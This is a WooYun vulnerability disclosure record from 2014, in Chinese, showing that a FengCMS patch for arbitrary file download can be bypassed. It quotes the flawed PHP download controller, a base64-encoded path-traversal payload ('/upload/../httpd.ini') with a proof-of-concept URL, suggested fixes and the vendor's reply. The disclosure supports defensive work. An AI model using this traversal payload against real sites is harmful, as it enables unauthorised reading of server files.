{"id": 53323, "wybug_id": "wooyun-2014-068086", "wybug_title": "FengCMS绕过补丁依旧任意文件下载", "wybug_corp": "fengcms.com", "wybug_author": "magerx", "wybug_date": "2014-07-10 18:39", "wybug_open_date": "2014-10-08 18:40", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-08：\t细节向公众公开  简要描述： 非常感谢各位白帽子的辛勤工作！FengCms安全测试站地址：http://guf521656.h163.92hezu.org/ 已经升级到最新版本 有效期2014-7-8至2014-7-15 欢迎各位安全界的朋友帮我们寻找安全漏洞！作为一个小小的创业团队，对各位朋友对FengCms的关注表示衷心的感谢！@路人甲 唉 厂商今天又艾特了，本来不想再看的。。 详细说明：  app/contorller/downController.php\n<?php/******************************************************************* * @authors FengCms  * @web     http://www.fengcms.com * @email   web@fengcms.com * @date    2013-10-30 16:00:12 * @version FengCms Beta 1.0 * @copy    Copyright © 2013-2018 Powered by DiFang Web Studio   *******************************************************************/// 请确保 php.ini 配置文件中 output_buffering 值为 On 或者 4096，为 Off 则会导致下载文件乱码。class downController extends Controller{\tpublic function index(){\t\t$_GET['file']=base64_decode($_GET['file']);\t\t$exp=explode(\"/\",$_GET['file']);\t\tif($exp[1]==\"upload\"){\t\t\tif(file_exists(ROOT_PATH.$_GET['file'])){\t\t\t\t\t\t\theader(\"Content-Type: application/force-download\");\t\t\t\theader(\"Content-Disposition: attachment; filename=\".basename($_GET['file'])); \t\t\t\treadfile(ROOT_PATH.$_GET['file']);\t\t\t}else{\t\t\t\techo '<script type=\"text/javascript\">alert(\"您要下载的文件不存在！\");history.back();</script>';\t\t\t}\t\t}else{\t\t\t\techo '<script type=\"text/javascript\">alert(\"您要下载的文件不存在！\");history.back();</script>';\t\t}a\t}}?>\n唉，这修复。。。等于没修复啊。直接file=/upload/../httpd.ini,bese64_encode下就好了。。。   漏洞证明：  厂商的测试地址：\nhttp://guf521656.h163.92hezu.org/index.php?controller=down&operate=index&file=L3VwbG9hZC8uLi9odHRwZC5pbmk=\n\n\n\n\n   修复方案：  1、限定目录2、直接取文件名吧3、白名单限定可下载路径啊文件。   版权声明：转载请注明来源 magerx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-07-10 18:41 厂商回复： 确实考虑欠周到。我们考虑加了一个过滤。过滤../来防止任意文件下载。谢谢你的提醒！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-10 20:34 |    \t\tVty \t\t\t( 普通白帽子  |\t\t\t        Rank:199 漏洞数:37        )\t\t \n  大哥来了！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}